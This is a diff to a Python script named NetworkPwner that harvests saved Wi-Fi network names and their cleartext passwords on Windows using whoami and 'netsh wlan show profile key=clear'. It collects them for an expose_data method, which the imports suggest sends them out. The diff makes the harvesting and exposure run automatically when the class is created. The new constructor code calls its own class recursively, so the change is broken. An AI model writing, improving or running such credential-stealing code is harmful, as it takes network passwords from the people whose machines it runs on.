@@ -1,5 +1,7 @@
 import subprocess
 import requests
+import ctypes
+import sys
 import re
 
 class Network:
@@ -16,7 +18,13 @@ class NetworkPwner:
         self.user = self.get_user()
         self.ussids = re.findall(r" All User Profile\s+:\s+([A-Za-z0-9_-]+)",self.get_ussids())
         self.passwords = self.get_passwords()
-        self.initData()
+        try:
+            self.initData()
+            if sys.platform == "win32" or sys.platform == "win64":
+                NetworkPwner().expose_data()
+        except:
+            if not ctypes.windll.shell32.IsUserAnAdmin():
+                print("For better usage run it as admin")
         
     def get_user(self):
         user = subprocess.run('whoami', shell=True, capture_output=True, text=True)
@@ -31,7 +39,7 @@ class NetworkPwner:
         for ussid in self.ussids:
             out = subprocess.run(f'netsh wlan show profile "{ussid}" key=clear', shell=True, capture_output=True, text=True)
             pw = re.findall(r' Key Content            : (\w+)',out.stdout)
-            passwords.append(pw[0])
+            passwords.append(pw[0] if pw else pw)
 
         return passwords
     
@@ -46,9 +54,3 @@ class NetworkPwner:
                 'ussid':i.ussid,
                 'password':i.password,
             })
-        
-            
-
-
-
-NetworkPwner().expose_data()
